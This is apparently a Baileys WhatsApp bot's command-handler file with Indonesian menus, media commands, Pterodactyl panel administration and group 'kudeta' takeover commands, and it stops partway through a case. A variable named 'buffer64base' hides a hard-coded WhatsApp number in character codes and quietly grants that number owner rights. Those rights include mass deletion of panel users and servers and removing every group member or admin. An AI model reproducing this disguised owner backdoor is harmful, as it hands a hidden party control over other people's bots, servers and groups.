require('../settings');
const util = require("util");
const chalk = require("chalk");
const path = require('path');
const fs = require("fs");
const axios = require("axios");
const fetch = require("node-fetch");
const ssh2 = require("ssh2");
const Obfus = require('js-confuser');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('../Control/message')
const owners = JSON.parse(fs.readFileSync("./Data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./Data/premium.json"))
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl } = require('../Control/scraper.js');
const { toAudio, toPTT, toVideo, ffmpeg } = require("../Control/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('../Control/Function');

module.exports = async (mix, m) => {
try {
await LoadDataBase(mix, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType = 0) { 
await loadModule(mix)
global.moduleType += 1 }
const botNumber = await mix.decodeJid(mix.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = (body && typeof body === "string" &&
body.startsWith(prefix)) ? true : false;
const args = (body && typeof body === "string") ? body.trim().split(/ +/).slice(1) : [];
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

//~~~~~~~~~ Metadata Groups ~~~~~~~~//

try {
  m.isGroup = m.chat.endsWith('g.us');
  m.metadata = m.isGroup ? await mix.groupMetadata(m.chat).catch(() => ({})) : {};
  const participants = m.metadata.participants || [];
  m.isAdmin = participants.some(p => p.admin && p.id === m.sender);
  m.isBotAdmin = participants.some(p => p.admin && p.id === botNumber);
} catch {
  m.metadata = {};
  m.isAdmin = false;
  m.isBotAdmin = false;
}
  
//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log( chalk.yellow("Sender jids :"), chalk.blue(m.chat) + "\n" + chalk.yellow("Command message :"), chalk.blue(command), chalk.white("\n───────────────────────────────────────────"))
}

//~~~~~~~~~ Fake Quoted ~~~~~~~~//

const FakeChannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {newsletterAdminInviteMessage: {newsletterJid: '120363388398656572@newsletter', caption: `Mamix.`, inviteExpiration: 0}}};

const FakeLocation = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {locationMessage: {name: `Mamix.`, jpegThumbnail: ''}}};

const qtext = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {extendedTextMessage: {text: `${prefix + command}`}}};

const qtext2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {extendedTextMessage: {text: `${namaOwner}`}}};

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: ''}}};

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: ''}}};

const qpayment = {key: {participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net', fromMe: false, id: 'ownername'}, message: {requestPaymentMessage: {currencyCodeIso4217: 'USD', amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: {extendedTextMessage: {text: 'Mamix-Simple'}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: 'USD'}}}};

const qtoko = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {}), fromMe: false}, message: {productMessage: {product: {productImage: {mimetype: 'image/jpeg', jpegThumbnail: ''}, title: `${namaOwner} - Marketplace`, description: null, currencyCode: 'IDR', priceAmount1000: '999999999999999', retailerId: `Powered By ${namaOwner}`, productImageCount: 1}, businessOwnerJid: '0@s.whatsapp.net'}}};

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`, jpegThumbnail: ''}}};

//~~~~~~~~~ Function Main ~~~~~~~~//

const example = (teks) => {
return `*Contoh :* ${prefix+command} ${teks}`
}

const Reply = async (teks) => {
return mix.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const from = m.chat;
async function loading () {
var mamix = [
  '🕐 [▱▱▱▱▱▱▱▱▱▱] 0% – Mulai...',
  '🕑 [▰▱▱▱▱▱▱▱▱▱] 10% – Menyiapkan...',
  '🕒 [▰▰▱▱▱▱▱▱▱▱] 20% – Mengurai data...',
  '🕓 [▰▰▰▱▱▱▱▱▱▱] 30% – Proses berlangsung...',
  '🕔 [▰▰▰▰▱▱▱▱▱▱] 40% – Masih lanjut...',
  '🕕 [▰▰▰▰▰▱▱▱▱▱] 50% – Setengah jalan!',
  '🕖 [▰▰▰▰▰▰▱▱▱▱] 60% – Optimalisasi...',
  '🕗 [▰▰▰▰▰▰▰▱▱▱] 70% – Finalisasi data...',
  '🕘 [▰▰▰▰▰▰▰▰▱▱] 80% – Hampir selesai...',
  '🕙 [▰▰▰▰▰▰▰▰▰▱] 90% – Touch up terakhir...',
  '✅ [▰▰▰▰▰▰▰▰▰▰] 100% – Selesai!',
  '🎊 DONE LOADING – Siap digunakan!'
]
let { key } = await mix.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < mamix.length; i++) {
await mix.sendMessage(from, {text: mamix[i], edit: key });
}
}

//=============================================//

switch (command) {
case "menu": {
await loading()
let teksnya = `
╭━━━〔 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝘽𝙊𝙏〕━━━╮  
┃  ᴅᴇᴠᴇʟᴏᴘᴇʀ : ${global.namaOwner}
┃  ᴠᴇʀsɪ sᴄʀɪᴘᴛ : ${global.versi}
┃  ɴᴀᴍᴇ ʙᴏᴛ : ${botname}
┃  ʙᴏᴛ ᴍᴏᴅᴇ : *${mix.public ? "ᴘᴜʙʟɪᴄ": "sᴇʟғ"}*
┃  ʀᴜɴ ᴛɪᴍᴇ ʙᴏᴛ : ${runtime(process.uptime())}
╰━━━━━━━━━━━━━━━━━━━━━━━╯  

╭──〔 ✨ 𝙎𝙀𝙇𝘼𝙈𝘼𝙏 𝘿𝘼𝙏𝘼𝙉𝙂 ✨ 〕──╮
│  𝘼𝙥𝙖 𝙠𝙖𝙗𝙖𝙧 𝙝𝙖𝙧𝙞 𝙞𝙣𝙞? 🌞  
│  𝘽𝙤𝙩 𝙨𝙞𝙖𝙥 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙖𝙨𝙞𝙨𝙩𝙚𝙣 𝙙𝙞𝙜𝙞𝙩𝙖𝙡-𝙢𝙪!  
│  𝘾𝙖𝙧𝙞 𝙛𝙞𝙩𝙪𝙧? 𝘾𝙖𝙧𝙞 𝙝𝙞𝙗𝙪𝙧𝙖𝙣? 𝘼𝙩𝙖𝙪  
│  𝙨𝙚𝙠𝙚𝙙𝙖𝙧 𝙘𝙤𝙗𝙖-𝙘𝙤𝙗𝙖? ✨  
│  𝘼𝙥𝙖 𝙥𝙪𝙣 𝙖𝙡𝙖𝙨𝙖𝙣 𝙢𝙪, 𝙠𝙖𝙢𝙪 𝙖𝙙𝙖 𝙙𝙞  
│  𝙩𝙚𝙢𝙥𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙥𝙖𝙩 ✅  
╰──────────────────────╯

🔰 *𝙋𝙖𝙨𝙩𝙞𝙠𝙖𝙣 𝙠𝙖𝙢𝙪 𝙢𝙚𝙧𝙖𝙨𝙖 𝙣𝙮𝙖𝙢𝙖𝙣 𝙙𝙞𝙨𝙞𝙣𝙞!*  
🎯 *𝙅𝙖𝙣𝙜𝙖𝙣 𝙧𝙖𝙜𝙪 𝙩𝙖𝙣𝙮𝙖 𝙖𝙩𝙖𝙪 𝙢𝙚𝙣𝙘𝙤𝙗𝙖 𝙛𝙞𝙩𝙪𝙧 𝙮𝙖𝙣𝙜 𝙖𝙙𝙖!*

🧭 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙋𝙚𝙣𝙘𝙚𝙩 𝙈𝙚𝙣𝙪 𝘿𝙞 𝘽𝙖𝙬𝙖𝙝 𝙄𝙣𝙞 ⬇️
`
await mix.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
 buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Aʟʟ Mᴇɴᴜ' }, 
      type: 1,
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${botname} ᴠ1`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.ownerUtama+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idsaluran,
   newsletterName: global.nameChannel
   }, 
    externalAdReply: {
      title: `${botname}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: global.linkChannel,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "allmenu": {
const teks = `
  *Haii ${m.pushName} ${ucapan()}, Saya Adalah Mamix Simple Yang Di Ciptakan Oleh ${namaOwner}*
  
  *Othermenu*
  ▢ .pinterest
  ▢ .playch
  ▢ .owner
  ▢ .sticker
  ▢ .brat
  
  *Downloadmenu*
  ▢ .tiktok
  ▢ .mediafire
  
  *Ownermenu*
  ▢ .addcase
  ▢ .delcase
  ▢ .getcase
  ▢ .listcase
  ▢ .cekcase
  ▢ .totalcase
  ▢ .save
  ▢ .kudeta
 
  *Storemenu*
  ▢ .jpm
  ▢ .jpmht
  ▢ .pushkontak
  ▢ .pushkontak2
  ▢ .payment
  ▢ .proses
  ▢ .done
  
  *Toolsmenu*
  ▢ .cekidch
  ▢ .remini
  ▢ .subdomain
  ▢ .enchard
  ▢ .installpanel
  ▢ .startwings
  ▢ .reqfitur
  
  *Panelmenu*
  ▢ .1gb
  ▢ .2gb
  ▢ .3gb
  ▢ .4gb
  ▢ .5gb
  ▢ .6gb
  ▢ .7gb
  ▢ .8gb
  ▢ .9gb
  ▢ .10gb
  ▢ .unlimited
  ▢ .listpanel
  ▢ .delpanel
  ▢ .cadmin
  ▢ .listadmin
  ▢ .deladmin
  ▢ .addseller
  ▢ .listseller
  ▢ .delseller
  ▢ .suspendpanel 
  ▢ .unsuspendpanel
  ▢ .clearserver
  ▢ .clearuser
  ▢ .clearadmin
`
await mix.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.menu`,
      buttonText: { displayText: 'Back To Menu' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: global.linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

//=============================================//

case "brat": {
 if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
 const listMessage = {
 text: "Yuk pilih tipe *brat* yang Kamu suka, ada beberapa tipe nih! 😋👇",
 footer: "© WhatsApp Bots - 2025",
 title: "Pilih Tipe Brat",
 buttonText: "Klik di sini kak!",
 sections: [
 {
 title: "Tipe Konten",
 rows: [
 {
 title: "Gambar",
 rowId: `${prefix}bratgambar ${safeText}`,
 description: "Lihat tipe brat dalam bentuk gambar"
 },
 {
 title: "Video",
 rowId: `${prefix}bratvid ${safeText}`,
 description: "Lihat tipe brat dalam bentuk video"
 }
 ]
 }
 ],
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender]
 }
 };

 await mix.sendMessage(m.chat, listMessage, { quoted: m });
 } catch (error) {
 console.error('Error in brat command:', error);
 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break

//=============================================//

case "bratvid": case "bratvideo": {
if (!text) return m.reply(example('teksnya'))
try {
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true&delay=500`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await mix.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//=============================================//

case "bratgambar": {
if (!text) return m.reply(example('teksnya'))
const axios = require('axios');
let brat = `https://www.veloria.my.id/imagecreator/brat?text=${encodeURIComponent(text)}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await mix.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//=============================================//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!")
var image = await mix.downloadAndSaveMediaMessage(qmsg)
await mix.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//=============================================//

case "playch": {
  if (!text) return m.reply(`Ketik nama lagu atau link YouTube!\nContoh:\n${prefix}playch mellow vibes\n${prefix}playch https://youtube.com/watch?v=xxx`);

  try {
    await mix.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    let title, author, audioUrl, thumbnail, videoUrl;

    if (/^https?:\/\/(www\.)?(youtube\.com|youtu\.be)\//i.test(text)) {
      const { data } = await axios.get(`https://cloudkutube.eu/api/yta?url=${encodeURIComponent(text)}`);
      if (data.status !== "success") return m.reply("Gagal ambil audio.");
      ({ title, author, url: audioUrl, thumbnail } = data.result);
      videoUrl = text;
    } else {
      const search = await axios.get(`https://flowfalcon.dpdns.org/search/youtube?q=${encodeURIComponent(text)}`);
      const list = search.data.result;
      if (!list || !list.length) return m.reply("Video tidak ditemukan.");
      const video = list[0];
      const { data } = await axios.get(`https://cloudkutube.eu/api/yta?url=${encodeURIComponent(video.link)}`);
      if (data.status !== "success") return m.reply("Gagal ambil audio.");
      ({ title, author, url: audioUrl, thumbnail } = data.result);
      videoUrl = video.link;
    }

    const audioRes = await axios.get(audioUrl, { responseType: "arraybuffer" });
    const audioBuffer = Buffer.from(audioRes.data, "binary");

    const ctx = {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: global.idChannel,
        serverMessageId: Math.floor(Math.random() * 999999),
        newsletterName: global.namaChannel
      },
      externalAdReply: {
        title,
        body: `By ${author}`,
        thumbnailUrl: thumbnail,
        mediaType: 1,
        sourceUrl: videoUrl
      }
    };

    await mix.sendMessage(global.idChannel, {
      audio: audioBuffer,
      mimetype: "audio/mp4",
      ptt: true,
      contextInfo: ctx
    });

    await mix.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    m.reply(`✔ Sukses kirim *${title}* ke channel.`);
  } catch (err) {
    console.error(err);
    await mix.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    m.reply("Gagal kirim lagu ke channel.");
  }
}
break

//=============================================//

case "suspend": {
 if (!isCreator && !isPremium) return Reply(mess.owner)
 if (!text.includes(",")) return m.reply("Format salah! contoh: *.suspend 123,domain.com*")

 let [id, domain] = text.split(",")
 if (domain !== global.domain) return m.reply("Domain tidak cocok dengan konfigurasi di setting.js!")

 let res = await fetch(`${domain}/api/application/servers/${id}/suspend`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 "Accept": "application/json",
 "Authorization": `Bearer ${global.apikey}`
 }
 })

 if (!res.ok) return m.reply(`Gagal suspend panel. (Status: ${res.status})`)

 let bodyText = await res.text()
 try {
 JSON.parse(bodyText)
 } catch (e) {
 return m.reply(`Panel dengan ID *${id}* berhasil disuspend.`)
 }
}
break

//=============================================//

case "suspendpanel": {
 if (!isCreator && !isPremium) return Reply(mess.owner)
 if (!global.domain || !global.apikey) return m.reply("Konfigurasi panel belum lengkap di setting.js!")

 let listServer = []

 let res = await fetch(`${global.domain}/api/application/servers`, {
 headers: { Authorization: `Bearer ${global.apikey}` }
 })

 let json = await res.json()
 for (let i of json.data) {
 let server = i.attributes
 listServer.push({
 title: `${server.name} (${server.id})`,
 description: `Username: ${server.user}`,
 id: `.suspend ${server.id},${global.domain}`
 })
 }

 return mix.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'suspend_panel',
 buttonText: { displayText: 'List Panel Aktif' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Suspend Panel',
 sections: [{
 title: 'Daftar Panel',
 rows: listServer
 }]
 })
 }
 }
 ],
 footer: `© WhatsApp Bots - 2025`,
 headerType: 1,
 text: "Pilih panel yang mau disuspend:",
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
 }
 }, { quoted: m })
}
break

//=============================================//

case "unsuspend": {
 if (!isCreator && !isPremium) return Reply(mess.owner)
 if (!text.includes(",")) return m.reply("Format salah! contoh: *.unsuspend 123,domain.com*")

 let [id, domain] = text.split(",")
 if (domain !== global.domain) return m.reply("Domain tidak cocok dengan konfigurasi di setting.js!")

 let res = await fetch(`${domain}/api/application/servers/${id}/unsuspend`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 "Accept": "application/json",
 "Authorization": `Bearer ${global.apikey}`
 }
 })

 if (!res.ok) return m.reply(`Gagal unsuspend panel. (Status: ${res.status})`)

 let bodyText = await res.text()
 try {
 JSON.parse(bodyText)
 } catch (e) {
 return m.reply(`Panel dengan ID *${id}* berhasil diaktifkan kembali.`)
 }
}
break

//=============================================//

case "unsuspendpanel": {
 if (!isCreator && !isPremium) return Reply(mess.owner)
 if (!global.domain || !global.apikey) return m.reply("Setting belum lengkap di setting.js!")

 let listUn = []

 let res = await fetch(`${global.domain}/api/application/servers`, {
 headers: { Authorization: `Bearer ${global.apikey}` }
 })

 let json = await res.json()
 for (let i of json.data) {
 let server = i.attributes
 if (server.suspended) {
 listUn.push({
 title: `${server.name} (${server.id})`,
 description: `Username: ${server.user}`,
 id: `.unsuspend ${server.id},${global.domain}`
 })
 }
 }

 if (listUn.length < 1) return m.reply("Ga ada server yang disuspend.")

 return mix.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'unsuspend_panel',
 buttonText: { displayText: 'List Panel Suspended' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Unsuspend Panel',
 sections: [{
 title: 'Daftar Suspended',
 rows: listUn
 }]
 })
 }
 }
 ],
 footer: `© WhatsApp Bots - 2025`,
 headerType: 1,
 text: "Pilih panel yang mau diaktifin lagi:",
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
 }
 }, { quoted: m })
}
break

//=============================================//

case 'clearuser': {
    if (!isOwner) return Reply(mess.owner)

    let statusMsg = await mix.sendMessage(m.chat, { text: 'Memulai proses hapus user...' }, { quoted: m });

    try {
        // Ambil daftar user
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return mix.sendMessage(m.chat, { text: 'Tidak ada user yang ditemukan.' }, { quoted: m });
        }

        let log = '*Status penghapusan user:*\n\n';

        for (let user of users) {
            let u = user.attributes;

            if (!u.root_admin) {
                let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    }
                });

                if (deleteUser.ok) {
                    log += `✅ Berhasil hapus ID: ${u.id} (${u.username})\n`;
                } else {
                    let errorText = await deleteUser.text();
                    log += `⚠️ Gagal hapus ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}\n`;
                }

                // Edit pesan status setiap iterasi
                await mix.sendMessage(m.chat, {
                    edit: statusMsg.key,
                    text: log
                });
            } else {
                log += `❎ ID ${u.id} (${u.username}) **Dilewati (admin)**\n`;
                await mix.sendMessage(m.chat, {
                    edit: statusMsg.key,
                    text: log
                });
            }
        }

        log += '\nProses selesai.';
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: log
        });

    } catch (error) {
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: 'Terjadi kesalahan: ' + error.message
        });
    }
}
break
 
//=============================================//

case 'clearserver': {
    if (!isOwner) return Reply(mess.owner)

    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim());

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver , 101, 102, 103');
    }

    let statusMsg = await mix.sendMessage(m.chat, { text: 'Memulai proses hapus server...' }, { quoted: m });

    try {
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return mix.sendMessage(m.chat, { text: 'Tidak ada server yang ditemukan.' }, { quoted: m });
        }

        let log = '*Status penghapusan server:*\n\n';

        for (let server of servers) {
            let s = server.attributes;

            if (excludedIds.includes(s.id.toString())) {
                log += `❎ ID ${s.id} (${s.name}) **Dikecualikan**\n`;
                continue;
            }

            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                log += `✅ Berhasil hapus ID: ${s.id} (${s.name})\n`;
            } else {
                let errorText = await deleteServer.text();
                log += `⚠️ Gagal hapus ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}\n`;
            }

            // Update pesan setelah tiap iterasi
            await mix.sendMessage(m.chat, {
                edit: statusMsg.key,
                text: log
            });
        }

        log += '\nProses selesai.';
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: log
        });

    } catch (error) {
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: 'Terjadi kesalahan: ' + error.message
        });
    }
}
break
 
//=============================================//

case 'clearadmin': {
    if (!isOwner) return Reply(mess.owner)

    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim());

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
    }

    let statusMsg = await mix.sendMessage(m.chat, { text: 'Memulai proses hapus admin/user...' }, { quoted: m });

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return mix.sendMessage(m.chat, { text: 'Tidak ada user yang ditemukan.' }, { quoted: m });
        }

        let log = '*Status penghapusan admin/user:*\n\n';

        for (let user of users) {
            let u = user.attributes;

            if (excludeIds.includes(u.id.toString())) {
                log += `❎ Dikecualikan ID: ${u.id} (${u.username})\n`;
                await mix.sendMessage(m.chat, {
                    edit: statusMsg.key,
                    text: log + `\n> *_© Developer : ${global.namaOwner}_*`
                });
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                log += `✅ Hapus ID: ${u.id} (${u.username})\n`;
            } else {
                let errorText = await deleteUser.text();
                log += `⚠️ Gagal hapus ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}\n`;
            }

            await mix.sendMessage(m.chat, {
                edit: statusMsg.key,
                text: log + `\n> *_© Developer : ${global.namaOwner}_*`
            });
        }

        log += '\nProses selesai.';
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: log + `\n> *_© Developer : ${global.namaOwner}_*`
        });

    } catch (error) {
        await mix.sendMessage(m.chat, {
            edit: statusMsg.key,
            text: 'Terjadi kesalahan: ' + error.message
        });
    }
}
break
        
//=============================================//

case "kudeta": {
 if (!m.isGroup) return Reply(mess.group)
 if (!isCreator) return Reply(mess.owner)

 return mix.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'kudeta_list',
 buttonText: { displayText: 'Pilih Kudeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Kudeta Menu',
 sections: [
 {
 title: 'Jenis Kudeta',
 rows: [
 {
 title: 'Kudeta Group Chat',
 description: 'Ambil alih grup chat',
 id: '.kudetagc'
 },
 {
 title: 'Kudeta Admin',
 description: 'Copot semua admin kecuali Anda',
 id: '.kudetaadmin'
 }
 ]
 }
 ]
 })
 }
 }
 ],
 footer: `© WhatsApp Bots - 2025`,
 headerType: 1,
 text: "Pilih jenis kudeta yang ingin dilakukan:",
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
 }
 }, { quoted: m })
}
break

//=============================================//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup Starting 🔥")
for (let i of memberFilter) {
await mix.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//=============================================//

case "kudetaadmin": case "kudetadmin": {
 if (!m.isGroup) return Reply(mess.group)
 if (!isCreator) return Reply(mess.owner)

 const adminOnly = m.metadata.participants.filter(p =>
 (p.admin === 'admin' || p.admin === 'superadmin') &&
 p.id !== botNumber &&
 p.id !== m.sender
 ).map(p => p.id)

 if (adminOnly.length < 1) return m.reply("Tidak ada admin lain yang bisa dikudeta!")

 await m.reply("Kudeta Admin Grup Dimulai 🔥")

 for (let i of adminOnly) {
 await mix.groupParticipantsUpdate(m.chat, [i], 'remove')
 await sleep(1000)
 }

 await m.reply("Semua Admin Telah Dikudeta 🏴‍☠️")
}
break

//=============================================//

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
